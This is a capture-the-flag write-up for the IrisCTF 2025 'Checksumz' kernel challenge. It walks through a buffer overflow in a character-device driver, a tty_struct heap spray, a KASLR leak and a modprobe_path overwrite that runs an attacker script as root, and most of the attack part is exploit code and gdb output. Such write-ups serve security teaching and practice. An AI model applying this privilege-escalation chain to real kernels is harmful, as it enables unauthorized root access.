+++
title = 'IrisCTF 2025 - Checksumz'
date = 2025-01-14T14:14:52-03:00
tags = ['exploitation', 'linux_kernel']
+++

# Problem statement

```goat
 "Someone told me that I can write faster programs by putting them into kernel
modules, so I replaced my checksum function with a char device." 
```

We're given a nicely setup environment with a vulnerable kernel module.

Below this the main struct with holds the driver's state per file descriptor.

```c
struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t s1;
	uint32_t s2;
};
```

It gets initialized in the `open` handler, note the `kzalloc` and pay attention
to the size of each allocation.

SLUB is the default allocator for most Linux systems and we know that it
allocates blocks in fixed sizes and the page frames are separate[1]. So,
`kmalloc-128` is used to allocations like 100 bytes, `kmalloc-256` for 200
bytes, etc.

```c
static int checksumz_open(struct inode *inode, struct file *file) {
	file->private_data = kzalloc(sizeof(struct checksum_buffer), GFP_KERNEL);
	struct checksum_buffer* buffer = (struct checksum_buffer*) file->private_data;

    // ...

	buffer->name = kzalloc(1000, GFP_KERNEL);

    // ...

	return 0;
}
```

In this case, since the allocations are above 512 and below 1024 bytes, they'll
get allocated in `kmalloc-1024`.

# Buffer overflow

Below are the `lseek` and `write` handlers. Note that the overflow happens
because we can set the `buffer->pos` to the end of the buffer, and during the
write, it'll overflow.

```c
static loff_t checksumz_llseek(struct file *file, loff_t offset, int whence) {
	struct checksum_buffer* buffer = file->private_data;

	switch (whence) {
		case SEEK_SET:
			buffer->pos = offset;
			break;
            // ...
	}

	if (buffer->pos < 0)
		buffer->pos = 0;

	if (buffer->pos >= buffer->size) // size is 256
		buffer->pos = buffer->size - 1; // so we can set it to 255

	return buffer->pos;
}

// ...

static ssize_t checksumz_write_iter(struct kiocb *iocb, struct iov_iter *from) {
    struct checksum_buffer* buffer = iocb->ki_filp->private_data;
    size_t bytes = iov_iter_count(from);

    if (!buffer)
        return -EBADFD;
    if (!bytes)
        return 0;

    ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from); // we can start write from 255 to 255 + 16

    buffer->pos += copied;
    if (buffer->pos >= buffer->size)
        buffer->pos = buffer->size - 1;
    
    return copied;
}
```

And there is also a `read` that overflows, it leaks **256** bytes instead of **16**.

```c
static ssize_t checksumz_read_iter(struct kiocb *iocb, struct iov_iter *to) {
// ...
    ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);
// ...
    return copied;
}
```

# hands on

Let's test our assumptions debugging the kernel with driver.
In the CTF challenge files we have symbols, so setting a breakpoint is as easy
as `b *(checksumz_write_iter+113)`.

And to trigger the breakpoint we can `open` the file descriptor and `write` to it:


```c
// ...
    int fd = open("/dev/checksumz", O_RDWR);
    ssize_t written_bytes = write(fd, &data, sizeof(data));
// ...
```

In gdb when the breakpoint is triggered, let's inspect the `checksum_buffer`:
object:

```bash
pwndbg> p/x $rbx
$5 = 0xff11000004a50800

pwndbg> p/x *((struct checksum_buffer*)$rbx)
$1 = {
  pos = 0x1ff,
  state = {0x0 <repeats 512 times>},
  size = 0x100,
  read = 0x0,
  name = 0xff11000004a51400,
  s1 = 0x1,
  s2 = 0x0
}

pwndbg> p/x ((struct checksum_buffer*)$rbx)->name-$rbx
$8 = 0xc00
pwndbg> p 0xc00/0x400
$9 = 3
```

Both heap allocations we discussed before are 1024 (0x400 in hex) aligned, i.e.
their addresses are multiples of 0x400. We can also see that both allocations
are close, just **0x400 * 3** bytes apart.

# unlocking abilities (getting a better primitive)

The first we're going to do is to override that `size` variable withthe
overflow we have in the `state` buffer, since they're next to each other we
just need to `lseek` to the end of `state` and then write a big value for `size`.

Now that we are no longer constrained by 16 bytes right after `state`, we can
also override the `name` string pointer. This is going to be very useful since
we can use the `rename` `ioctl` to write to that pointer 48 bytes.

```c
static long checksumz_ioctl(struct file *file, unsigned int command, unsigned long arg) {
	struct checksum_buffer* buffer = file->private_data;
jk
	if (!file->private_data)
		return -EBADFD;
	
	switch (command) {
        // ...
		case CHECKSUMZ_IOCTL_RENAME:
			char __user *user_name_buf = (char __user*) arg;

			if (copy_from_user(buffer->name, user_name_buf, 48)) {
				return -EFAULT;
			}
        // ...
```


By overwriting the value in the `name` pointer and calling the `rename` `ioctl`
we have an arbitrary write anywhere in the kernel :)

```c
void arb_write(int fd, uint64_t addr, uint64_t* data) {
    lseek(fd, 0x210, addr);
    write(fd, &addr, sizeof(addr));

    if (ioctl(fd, CHECKSUMZ_IOCTL_RENAME, data) < 0) {
        perror("ioctl - CHECKSUMZ_IOCTL_RENAME");
    }
}
```

# Heap magic



Oops, the writeup for this part is in progress...


`modprobe_path`, `KASLR`, `kmalloc-1024`

Since we have a overflow on a object allocated to `kmalloc-1024` the heap
layout will look like this:


```goat
┌──────┬─────┬─────────────────┬───────────┐
│ data │ ??? │ checksum_buffer │ ???       │
├──────┼─────┼─────────────────┼───────────┤
│ addr │ ?   │ ? + 0x400       │ ? + 0x800 │
└──────┴─────┴─────────────────┴───────────┘
```

We can read and write to those objects since we can just offset via `lseek` by
0x400 steps. We want to organize the heap in a way that we know which objects
will be allocated next to our `checksum_buffer` struct. Looking for
`kmalloc-1024` at [2] we see that there is `tty_struct` that can be allocated
by opening `/dev/ptmx`.

Below is the code to spray the heap with `tty_structs` which will be placed at
`kmalloc-1024`. We allocate objects before too, to defragment the heap's freelist
and to ensure that it'll work if the heap grows backwards or forwards.

```c
    // spray sandwich below:
    // the sprayed objs are tty_struct
    // ref: https://elixir.bootlin.com/linux/v6.10.10/source/include/linux/tty.h#L188
    //
    // spray before (bread)
    int spray[SPRAY_SZ];
    for(int i = 0; i < SPRAY_SZ / 2; i++) {
        spray[i] = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) {
            __asm__("int3");
        }
    }

    // object with overflow (cheese)
    int fd = open("/dev/checksumz", O_RDWR);

    // spray after (bread)
    for(int i = SPRAY_SZ / 2; i < SPRAY_SZ; i++) {
        spray[i] = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) {
            __asm__("int3");
        }
    }
```

After the code above is executed the heap will look like the diagram below:

```goat
┌──────┬────────────┬─────────────────┬────────────┐
│ data │ tty_struct │ checksum_buffer │ tty_struct │
├──────┼────────────┼─────────────────┼────────────┤
│ addr │ ?          │ ? + 0x400       │ ? + 0x800  │
└──────┴────────────┴─────────────────┴────────────┘
```

We'll verify our understanding of the system by debugging it with gdb again.
When we run those commands below, `rbx` is holding the value of a address of a
`checksum_buffer`.

```bash
pwndbg> p/x $rbx
$2 = 0xff11000004962400

pwndbg> telescope 0xff11000004962400+0x400
00:0000│  0xff11000004962800 ◂— 0x7e00000001
01:0008│  0xff11000004962808 ◂— 0
02:0010│  0xff11000004962810 —▸ 0xff1100000414b240 ◂— 0x101
03:0018│  0xff11000004962818 —▸ 0xff110000048edc00 —▸ 0xff110000048edc50 ◂— 0
04:0020│  0xff11000004962820 —▸ 0xffffffff82289480 (ptm_unix98_ops) —▸ 0xffffffff8163dfa0 (ptm_unix98_lookup) ◂— endbr64
05:0028│  0xff11000004962828 —▸ 0xff1100000459b050 —▸ 0xffffffff82bd14a0 (n_tty_ops) —▸ 0xffffffff82722080 (.LC3+121) ◂— 0x7264007974745f6e /* 'n_tty' */
06:0030│  0xff11000004962830 ◂— 0
07:0038│  0xff11000004962838 ◂— 0

pwndbg> telescope 0xff11000004962400+0x400*3
00:0000│  0xff11000004963000 ◂— 0x7e00000001
01:0008│  0xff11000004963008 ◂— 0
02:0010│  0xff11000004963010 —▸ 0xff1100000414b840 ◂— 0x101
03:0018│  0xff11000004963018 —▸ 0xff110000048ed400 —▸ 0xff110000048ed450 ◂— 0
04:0020│  0xff11000004963020 —▸ 0xffffffff82289360 (pty_unix98_ops) —▸ 0xffffffff8163e4c0 (pts_unix98_lookup) ◂— endbr64
05:0028│  0xff11000004963028 —▸ 0xff1100000459b5f0 —▸ 0xffffffff82bd14a0 (n_tty_ops) —▸ 0xffffffff82722080 (.LC3+121) ◂— 0x7264007974745f6e /* 'n_tty' */
06:0030│  0xff11000004963030 ◂— 0
07:0038│  0xff11000004963038 ◂— 0
```

Note the values at the offsets `0x20`:  `0xffffffff82289480` and `0xffffffff82289360`. These are high memory addresses that point to global variables on the kernel, we can use them to break `KASLR`

```c
for (int i = 1; i <= 8; i++) {
    uint64_t kbase_leak = io_read(fd, 0x400 * i + (3 * 0x8)); // next kmalloc-1024 slot
    if (kbase_leak < 0xffffffff81000000) continue;  // verify that we have a high-address pointer

    printf("(~) kbase_leak %016lx\n", kbase_leak);
    //ref: https://elixir.bootlin.com/linux/v6.10.10/source/drivers/tty/pty.c#L745
    uint64_t ptm_unix98_ops_offset = 0xffffffff82289360 - 0xffffffff81000000;
    kbase = (kbase_leak - ptm_unix98_ops_offset) & 0xffffffffffff0000;
    break;
}

```

# Arb write + KASLR leak = PRIVESC


Now that we have those primitives, it's just a matter of rewriting the
`modprobe_path` variable (_see [1]_) and executing a malformed binary.

```c
uint64_t modprobe_path_offset = 0xffffffff82b3f100 - 0xffffffff81000000;
printf("(!) modprobe_path: %016lx\n", kbase + modprobe_path_offset);

write_global(fd, kbase + modprobe_path_offset, (uint64_t*)"/tmp/p");
system("echo -ne '#!/bin/sh\ncat /dev/vda > /tmp/flag' > /tmp/p");
system("chmod a+x /tmp/p");
system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
system("chmod a+x /tmp/executeme");
printf("(!) Modprobe Setup done :)\n");
system("/tmp/executeme");

char flag_buf[0x200];
FILE* flag = fopen("/tmp/flag", "r");
fscanf(flag, "%s", flag_buf);
printf("(~) FLAG: %s\n", flag_buf);
```

# References


- [1] - https://pawnyable.cafe/linux-kernel/ 
- [2] - https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
